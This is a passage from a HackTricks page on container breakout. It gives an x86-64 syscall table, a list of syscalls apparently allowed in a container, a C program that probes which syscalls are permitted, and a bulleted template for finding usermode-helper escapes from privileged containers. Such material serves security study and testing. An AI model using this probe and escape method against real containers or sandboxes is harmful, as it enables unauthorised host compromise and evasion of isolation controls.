| 105                    | setuid            |
| 106                    | setgid            |
| 107                    | geteuid           |
| 108                    | getegid           |
| 109                    | setpgid           |
| 110                    | getppid           |
| 111                    | getpgrp           |
| 112                    | setsid            |
| 113                    | setreuid          |
| 114                    | setregid          |
| 115                    | getgroups         |
| 116                    | setgroups         |
| 117                    | setresuid         |
| 118                    | getresuid         |
| 119                    | setresgid         |
| 120                    | getresgid         |
| 121                    | getpgid           |
| 122                    | setfsuid          |
| 123                    | setfsgid          |
| 124                    | getsid            |
| 125                    | capget            |
| 126                    | capset            |
| 127                    | rt_sigpending     |
| 128                    | rt_sigtimedwait   |
| 129                    | rt_sigqueueinfo   |
| 130                    | rt_sigsuspend     |
| 131                    | sigaltstack       |
| 132                    | utime             |
| 133                    | mknod             |
| 134                    | uselib            |
| 135                    | personality       |
| 136                    | ustat             |
| 137                    | statfs            |
| 138                    | fstatfs           |
| 139                    | sysfs             |
| 140                    | getpriority       |
| 141                    | setpriority       |
| 142                    | sched_setparam    |
| 143                    | sched_getparam    |
| 144                    | sched_setscheduler |
| 145                    | sched_getscheduler |
| 146                    | sched_get_priority_max |
| 147                    | sched_get_priority_min |
| 148                    | sched_rr_get_interval |
| 149                    | mlock             |
| 150                    | munlock           |
| 151                    | mlockall          |
| 152                    | munlockall        |
| 153                    | vhangup           |
| 154                    | modify_ldt        |
| 155                    | pivot_root        |
| 156                    | _sysctl           |
| 157                    | prctl             |
| 158                    | arch_prctl        |
| 159                    | adjtimex          |
| 160                    | setrlimit         |
| 161                    | chroot            |
| 162                    | sync              |
| 163                    | acct              |
| 164                    | settimeofday     |
| 165                    | mount             |
| 166                    | umount2           |
| 167                    | swapon            |
| 168                    | swapoff           |
| 169                    | reboot            |
| 170                    | sethostname       |
| 171                    | setdomainname     |
| 172                    | iopl              |
| 173                    | ioperm            |
| 174                    | create_module     |
| 175                    | init_module       |
| 176                    | delete_module     |
| 177                    | get_kernel_syms   |
| 178                    | query_module      |
| 179                    | quotactl          |
| 180                    | nfsservctl        |
| 181                    | getpmsg           |
| 182                    | putpmsg           |
| 183                    | afs_syscall       |
| 184                    | tuxcall           |
| 185                    | security          |
| 186                    | gettid            |
| 187                    | readahead         |
| 188                    | setxattr          |
| 189                    | lsetxattr         |
| 190                    | fsetxattr         |
| 191                    | getxattr          |
| 192                    | lgetxattr         |
| 193                    | fgetxattr         |
| 194                    | listxattr         |
| 195                    | llistxattr        |
| 196                    | flistxattr        |
| 197                    | removexattr       |
| 198                    | lremovexattr      |
| 199                    | fremovexattr      |
| 200                    | tkill             |
| 201                    | time              |
| 202                    | futex             |
| 203                    | sched_setaffinity |
| 204                    | sched_getaffinity |
| 205                    | set_thread_area   |
| 206                    | io_setup          |
| 207                    | io_destroy        |
| 208                    | io_getevents      |
| 209                    | io_submit         |
| 210                    | io_cancel         |
| 211                    | get_thread_area   |
| 212                    | lookup_dcookie    |
| 213                    | epoll_create      |
| 214                    | epoll_ctl_old     |
| 215                    | epoll_wait_old    |
| 216                    | remap_file_pages  |
| 217                    | getdents64        |
| 218                    | set_tid_address   |
| 219                    | restart_syscall   |
| 220                    | semtimedop        |
| 221                    | fadvise64         |
| 222                    | timer_create      |
| 223                    | timer_settime     |
| 224                    | timer_gettime     |
| 225                    | timer_getoverrun  |
| 226                    | timer_delete      |
| 227                    | clock_settime     |
| 228                    | clock_gettime     |
| 229                    | clock_getres      |
| 230                    | clock_nanosleep   |
| 231                    | exit_group        |
| 232                    | epoll_wait        |
| 233                    | epoll_ctl         |
| 234                    | tgkill            |
| 235                    | utimes            |
| 236                    | vserver           |
| 237                    | mbind             |
| 238                    | set_mempolicy     |
| 239                    | get_mempolicy     |
| 240                    | mq_open           |
| 241                    | mq_unlink         |
| 242                    | mq_timedsend      |
| 243                    | mq_timedreceive   |
| 244                    | mq_notify         |
| 245                    | mq_getsetattr     |
| 246                    | kexec_load        |
| 247                    | waitid            |
| 248                    | add_key           |
| 249                    | request_key       |
| 250                    | keyctl            |
| 251                    | ioprio_set        |
| 252                    | ioprio_get        |
| 253                    | inotify_init      |
| 254                    | inotify_add_watch |
| 255                    | inotify_rm_watch  |
| 256                    | migrate_pages     |
| 257                    | openat            |
| 258                    | mkdirat           |
| 259                    | mknodat           |
| 260                    | fchownat          |
| 261                    | futimesat         |
| 262                    | newfstatat        |
| 263                    | unlinkat          |
| 264                    | renameat          |
| 265                    | linkat            |
| 266                    | symlinkat         |
| 267                    | readlinkat        |
| 268                    | fchmodat          |
| 269                    | faccessat         |
| 270                    | pselect6          |
| 271                    | ppoll             |
| 272                    | unshare           |
| 273                    | set_robust_list   |
| 274                    | get_robust_list   |
| 275                    | splice            |
| 276                    | tee               |
| 277                    | sync_file_range   |
| 278                    | vmsplice          |
| 279                    | move_pages        |
| 280                    | utimensat         |
| 281                    | epoll_pwait       |
| 282                    | signalfd          |
| 283                    | timerfd_create    |
| 284                    | eventfd           |
| 285                    | fallocate         |
| 286                    | timerfd_settime   |
| 287                    | timerfd_gettime   |
| 288                    | accept4           |
| 289                    | signalfd4         |
| 290                    | eventfd2          |
| 291                    | epoll_create1     |
| 292                    | dup3              |
| 293                    | pipe2             |
| 294                    | inotify_init1     |
| 295                    | preadv            |
| 296                    | pwritev           |
| 297                    | rt_tgsigqueueinfo |
| 298                    | perf_event_open   |
| 299                    | recvmmsg          |
| 300                    | fanotify_init     |
| 301                    | fanotify_mark     |
| 302                    | prlimit64         |
| 303                    | name_to_handle_at |
| 304                    | open_by_handle_at |
| 305                    | clock_adjtime     |
| 306                    | syncfs            |
| 307                    | sendmmsg          |
| 308                    | setns             |
| 309                    | getcpu            |
| 310                    | process_vm_readv  |
| 311                    | process_vm_writev |
| 312                    | kcmp              |
| 313                    | finit_module      |
| 314                    | sched_setattr     |
| 315                    | sched_getattr     |
| 316                    | renameat2         |
| 317                    | seccomp           |
| 318                    | getrandom         |
| 319                    | memfd_create      |
| 320                    | kexec_file_load   |
| 321                    | bpf               |
| 322                    | execveat          |
| 323                    | userfaultfd       |
| 324                    | membarrier        |
| 325                    | mlock2            |
| 326                    | copy_file_range   |
| 327                    | preadv2           |
| 328                    | pwritev2          |
| 329                    | pkey_mprotect     |
| 330                    | pkey_alloc        |
| 331                    | pkey_free         |
| 332                    | statx             |
| 333                    | io_pgetevents     |
| 334                    | rseq              |
| 424                    | pidfd_send_signal |
| 425                    | io_uring_setup    |
| 426                    | io_uring_enter    |
| 427                    | io_uring_register |
| 428                    | open_tree         |
| 429                    | move_mount        |
| 430                    | fsopen            |
| 431                    | fsconfig          |
| 432                    | fsmount           |
| 433                    | fspick            |
| 434                    | pidfd_open        |
| 435                    | clone3            |
| 436                    | close_range       |
| 437                    | openat2           |
| 438                    | pidfd_getfd       |
| 439                    | faccessat2        |
| 440                    | process_madvise   |
| 512                    | rt_sigaction      |
| 513                    | rt_sigreturn      |
| 514                    | ioctl             |
| 515                    | readv             |
| 516                    | writev            |
| 517                    | recvfrom          |
| 518                    | sendmsg           |
| 519                    | recvmsg           |
| 520                    | execveat          |
| 521                    | membarrier        |
| 522                    | userfaultfd       |
| 523                    | copy_file_range   |
| 524                    | preadv2           |
| 525                    | pwritev2          |
| 526                    | pkey_mprotect     |
| 527                    | pkey_alloc        |
| 528                    | pkey_free         |
| 529                    | statx             |
| 530                    | io_pgetevents     |
| 531                    | rseq              |
| 532                    | pidfd_send_signal |
| 533                    | io_uring_setup    |
| 534                    | io_uring_enter    |
| 535                    | io_uring_register |
| 536                    | open_tree         |
| 537                    | move_mount        |
| 538                    | fsopen            |
| 539                    | fsconfig          |
| 540                    | fsmount           |
| 541                    | fspick            |
| 542                    | pidfd_open        |
| 543                    | clone3            |
| 544                    | close_range       |
| 545                    | openat2           |
| 546                    | pidfd_getfd       |
| 547                    | faccessat2        |
| 548                    | process_madvise   |

{% endtab %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
